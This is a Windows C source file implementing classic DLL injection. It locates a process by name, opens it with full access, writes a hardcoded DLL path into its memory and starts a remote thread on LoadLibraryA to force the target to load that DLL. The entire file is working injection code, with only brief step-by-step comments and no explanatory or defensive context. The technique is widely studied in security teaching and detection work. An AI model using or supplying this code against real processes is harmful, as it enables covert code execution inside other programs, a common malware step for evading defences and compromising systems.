#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

int findProcess(const char* procname) {
	HANDLE hSnapshot;
	PROCESSENTRY32 pe;
	int pid = 0;
	BOOL hResult;
	// snapshot of all processes in the system
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

	// initializing size: needed for using Process32First
	pe.dwSize = sizeof(PROCESSENTRY32);
	// info about first process encountered in a system snapshot
	hResult = Process32First(hSnapshot, &pe);

	// retrieve information about the processes and exit if unsuccessful
	while (hResult) {
		// if we find the process: return process ID
		if (strcmp(procname, pe.szExeFile) == 0) {
			pid = pe.th32ProcessID;
			break;
		}
		hResult = Process32Next(hSnapshot, &pe);
	}
	// closes an open handle (CreateToolhelp32Snapshot)
	CloseHandle(hSnapshot);
	return pid;
}

CHAR pathToDll[] = "C:\\Dll1.dll";
unsigned int len = sizeof(pathToDll) + 1;

int main(int argc, char* argv[]) {
	HANDLE process_handle;
	PVOID remote_buffer;

	// handle to kernel32 and pass it to GetProcAddress
	HMODULE hKernel32 = GetModuleHandle("Kernel32");
	VOID* ptrLoadLibraryA = GetProcAddress(hKernel32, "LoadLibraryA");

	// find process
	printf("%-15s : %s\n", "Process name", argv[1]);
	printf("%-15s : %d\n", "PID", findProcess(argv[1]));
	process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(findProcess(argv[1])));
	if (process_handle == NULL) return 0;
	printf("Process opened...\n");

	// allocate memory buffer for remote process
	remote_buffer = VirtualAllocEx(process_handle, NULL, len, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
	if (remote_buffer == NULL) return 0;
	printf("%-15s : 0x%-016p\n", "alloc_mem addr", (void*)remote_buffer);

	// write pathToDll in another process memory
	if (!WriteProcessMemory(process_handle, remote_buffer, pathToDll, len, NULL)) return 0;

	printf("Press Enter to Create Thread!\n");
	getchar();

	// start new thread in another process by calling LoadLibraryA and the pathToDll as a parameter
	CreateRemoteThread(process_handle, NULL, 0, (LPTHREAD_START_ROUTINE)ptrLoadLibraryA, remote_buffer, 0, NULL);
	CloseHandle(process_handle);
	return 0;
}